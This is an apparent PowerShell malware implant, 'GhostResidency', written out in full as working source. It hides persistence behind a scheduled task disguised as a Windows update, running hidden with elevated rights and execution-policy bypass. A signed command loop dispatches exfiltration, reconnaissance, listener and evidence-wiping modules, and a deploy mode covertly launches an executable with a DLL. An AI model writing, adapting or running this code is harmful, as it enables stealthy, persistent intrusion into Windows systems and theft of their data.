# GhostResidency.ps1 v1.6.0
# Persistent implant loader and command handler
# Memory-resident operations with enhanced security

param(
    [ValidateSet("Recon", "Pulse", "Deploy", "Interactive")]
    [string]$Mode = "Recon",
    [string]$GhostTag,
    [switch]$NoPersistence
)

$script:Version = "1.6.0"
$script:CfgPath = "C:\ProgramData\.ghost.cfg"
$script:PulseInterval = 60
$script:MaxPulseCount = 1440
$script:OperatorKey = 'RvL_0517'

function Write-GhostLog {
    param([string]$Message, [string]$Component = "Residency", [string]$Level = "INFO")
    $logFile = "$env:ProgramData\ghost_ops_log.txt"
    $timestamp = Get-Date -Format o
    try {
        Add-Content -Path $logFile -Value "[$timestamp][$Component][$Level] $Message" -ErrorAction SilentlyContinue
    } catch {}
}

function Get-HMAC {
    param([string]$Data, [string]$Key)
    $kb = [Text.Encoding]::UTF8.GetBytes($Key)
    $db = [Text.Encoding]::UTF8.GetBytes($Data)
    $hmac = New-Object Security.Cryptography.HMACSHA256
    $hmac.Key = $kb
    return ([BitConverter]::ToString($hmac.ComputeHash($db))) -replace '-', ''
}

function Test-ValidSignature {
    param([string]$Command, [string]$Timestamp, [string]$Signature)
    
    $expected = Get-HMAC -Data "$Command|$Timestamp" -Key $script:OperatorKey
    return ($expected -eq $Signature)
}

function Initialize-GhostSession {
    param([string]$Tag)
    
    $sessionTag = if ($Tag) { $Tag } else { "Gx$(Get-Random -Minimum 1000 -Maximum 9999)" }
    
    $cfg = @{
        ghostTag = $sessionTag
        timestamp = (Get-Date).ToUniversalTime().ToString("o")
        sessionId = [guid]::NewGuid().ToString()
        version = $script:Version
        mode = $Mode
    }
    
    $cfg.signature = Get-HMAC -Data "$($cfg.ghostTag)|$($cfg.timestamp)" -Key $script:OperatorKey
    
    try {
        $cfg | ConvertTo-Json | Set-Content -Path $script:CfgPath -Force
        Write-GhostLog "Session initialized: $sessionTag"
    } catch {
        Write-GhostLog "Failed to write config: $_" -Level "ERROR"
    }
    
    return $sessionTag
}

function Get-CurrentConfig {
    if (-not (Test-Path $script:CfgPath)) { return $null }
    
    try {
        return Get-Content $script:CfgPath | ConvertFrom-Json
    } catch {
        return $null
    }
}

function Deploy-SupportModules {
    $modulesDir = "$env:TEMP\GhostModules_$(Get-Random)"
    New-Item -ItemType Directory -Path $modulesDir -Force | Out-Null
    
    $moduleFiles = @(
        @{ Name = "GhostLogger.ps1"; Source = "$PSScriptRoot\Modules\GhostLogger.ps1" },
        @{ Name = "GhostSeal.ps1"; Source = "$PSScriptRoot\GhostSeal.ps1" },
        @{ Name = "GhostHollow.ps1"; Source = "$PSScriptRoot\GhostHollow.ps1" }
    )
    
    foreach ($mod in $moduleFiles) {
        if (Test-Path $mod.Source) {
            $destPath = Join-Path $modulesDir $mod.Name
            Copy-Item -Path $mod.Source -Destination $destPath -Force
            Write-GhostLog "Deployed module: $($mod.Name)"
        }
    }
    
    return $modulesDir
}

function Handle-Command {
    param(
        [string]$Command,
        [string]$GhostTag,
        [string]$ModulesPath
    )
    
    Write-GhostLog "Executing command: $Command for tag: $GhostTag"
    
    $result = @{
        Command = $Command
        Success = $false
        Output = $null
        Timestamp = (Get-Date).ToUniversalTime()
    }
    
    switch ($Command.ToUpper()) {
        "LOG" {
            $loggerScript = Join-Path $ModulesPath "GhostLogger.ps1"
            if (Test-Path $loggerScript) {
                . $loggerScript
                $result.Output = Read-GhostLog -Tail 50
                $result.Success = $true
            }
        }
        "SEAL" {
            $sealScript = Join-Path $ModulesPath "GhostSeal.ps1"
            if (Test-Path $sealScript) {
                & $sealScript -ghostTag $GhostTag
                $result.Success = $true
            }
        }
        "EXFIL" {
            $hollowScript = Join-Path $ModulesPath "GhostHollow.ps1"
            if (Test-Path $hollowScript) {
                & $hollowScript -ghostTag $GhostTag
                $result.Success = $true
            }
        }
        "EXORCIST" {
            $exorcistScript = "$PSScriptRoot\Modules\ExorcistMode.ps1"
            if (Test-Path $exorcistScript) {
                & $exorcistScript -Mode "anoint"
                & $exorcistScript -Mode "bind"
                & $exorcistScript -Mode "cleanse"
                $result.Success = $true
            }
        }
        "WORMHOLE" {
            $wormholeScript = "$PSScriptRoot\Modules\Wormhole.ps1"
            if (Test-Path $wormholeScript) {
                . $wormholeScript
                if (Get-Command -Name Start-WormholeListener -ErrorAction SilentlyContinue) {
                    Start-WormholeListener -Timeout 300
                    $result.Success = $true
                }
            }
        }
        "PHANTOM" {
            $phantomScript = "$PSScriptRoot\Modules\Phantom.ps1"
            if (Test-Path $phantomScript) {
                . $phantomScript
                if (Get-Command -Name Start-PhantomRecon -ErrorAction SilentlyContinue) {
                    $result.Output = Start-PhantomRecon -Mode "Quick"
                    $result.Success = $true
                }
            }
        }
        "ANOMALY" {
            $anomalyScript = "$PSScriptRoot\Modules\AnomalyHunter.ps1"
            if (Test-Path $anomalyScript) {
                . $anomalyScript
                if (Get-Command -Name Start-AnomalyHunt -ErrorAction SilentlyContinue) {
                    Start-AnomalyHunt -Path "$env:TEMP"
                    $result.Success = $true
                }
            }
        }
        "STATUS" {
            $result.Output = @{
                Host = $env:COMPUTERNAME
                User = $env:USERNAME
                Uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
                ProcessCount = (Get-Process).Count
                GhostTag = $GhostTag
            }
            $result.Success = $true
        }
        "WIPE" {
            $filesToRemove = @($ModulesPath, $script:CfgPath)
            foreach ($path in $filesToRemove) {
                if (Test-Path $path) {
                    Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
            Write-GhostLog "Wipe command executed"
            $result.Success = $true
        }
        "HEARTBEAT" {
            Write-GhostLog "Heartbeat received"
            $result.Success = $true
            $result.Output = "ALIVE"
        }
        default {
            Write-GhostLog "Unknown command: $Command" -Level "WARN"
        }
    }
    
    return $result
}

function Set-Persistence {
    param([switch]$Stealth)
    
    if ($NoPersistence) { return }
    
    try {
        $randomSuffix = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
        $taskName = if ($Stealth) { "WinUpdate_$randomSuffix" } else { "GhostPulse_$randomSuffix" }
        
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Mode Pulse"
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) -RepetitionInterval (New-TimeSpan -Minutes 2)
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
        
        Write-GhostLog "Persistence established: $taskName"
        return $taskName
        
    } catch {
        Write-GhostLog "Persistence failed: $_" -Level "ERROR"
        return $null
    }
}

function Start-GhostResidency {
    param(
        [ValidateSet("Recon", "Pulse", "Deploy", "Interactive")]
        [string]$Mode = "Recon",
        [string]$GhostTag
    )
    
    Write-GhostLog "GhostResidency v$script:Version starting in $Mode mode"
    
    $tag = Initialize-GhostSession -Tag $GhostTag
    $modulesPath = Deploy-SupportModules
    
    switch ($Mode) {
        "Recon" {
            Set-Persistence -Stealth
            
            if (Test-Path "$PSScriptRoot\Modules\Phantom.ps1") {
                . "$PSScriptRoot\Modules\Phantom.ps1"
                if (Get-Command -Name Start-PhantomRecon -ErrorAction SilentlyContinue) {
                    $recon = Start-PhantomRecon -Mode "Fingerprint"
                    Write-GhostLog "Recon complete: $($recon.Data.Network.Hostname)"
                }
            }
        }
        "Pulse" {
            Start-PulseLoop -GhostTag $tag -ModulesPath $modulesPath
        }
        "Deploy" {
            Set-Persistence
            
            $ghostDll = "$PSScriptRoot\GhostKey.dll"
            $wraithTap = "$PSScriptRoot\WraithTap.exe"
            
            if ((Test-Path $ghostDll) -and (Test-Path $wraithTap)) {
                Start-Process -WindowStyle Hidden -FilePath $wraithTap -ArgumentList $ghostDll
                Write-GhostLog "GhostKey deployed via WraithTap"
            }
        }
        "Interactive" {
            Write-Host "[GhostResidency] Interactive mode - Tag: $tag" -ForegroundColor Cyan
            
            while ($true) {
                $cmd = Read-Host "Ghost>"
                if ($cmd -eq "exit" -or $cmd -eq "quit") { break }
                
                $result = Handle-Command -Command $cmd -GhostTag $tag -ModulesPath $modulesPath
                if ($result.Output) {
                    $result.Output | Format-List
                }
            }
        }
    }
    
    return $tag
}

function Start-PulseLoop {
    param(
        [string]$GhostTag,
        [string]$ModulesPath
    )
    
    $pulseCount = 0
    
    while ($pulseCount -lt $script:MaxPulseCount) {
        $pulseCount++
        
        if (Test-Path $script:CfgPath) {
            try {
                $cfg = Get-Content $script:CfgPath | ConvertFrom-Json
                
                if ($cfg.command -and $cfg.timestamp -and $cfg.signature) {
                    $cmdTime = [datetime]::Parse($cfg.timestamp)
                    $age = (Get-Date).ToUniversalTime().Subtract($cmdTime).TotalMinutes
                    
                    if (Test-ValidSignature -Command $cfg.command -Timestamp $cfg.timestamp -Signature $cfg.signature) {
                        if ($age -lt 10) {
                            $result = Handle-Command -Command $cfg.command -GhostTag $cfg.ghostTag -ModulesPath $ModulesPath
                            
                            $cfg.PSObject.Properties.Remove('command')
                            $cfg | ConvertTo-Json | Set-Content -Path $script:CfgPath -Force
                        }
                    }
                }
                
            } catch {
                Write-GhostLog "Pulse config error: $_" -Level "ERROR"
            }
        }
        
        if ($pulseCount % 10 -eq 0) {
            Write-GhostLog "Heartbeat pulse #$pulseCount"
        }
        
        Start-Sleep -Seconds $script:PulseInterval
    }
    
    Write-GhostLog "Pulse loop ended after $pulseCount cycles"
}

# === MAIN EXECUTION ===

if ($MyInvocation.InvocationName -ne '.' -and $MyInvocation.InvocationName -ne '&') {
    $tag = if ($GhostTag) { $GhostTag } else { $null }
    Start-GhostResidency -Mode $Mode -GhostTag $tag
}

Export-ModuleMember -Function Start-GhostResidency, Initialize-GhostSession, Handle-Command -ErrorAction SilentlyContinue
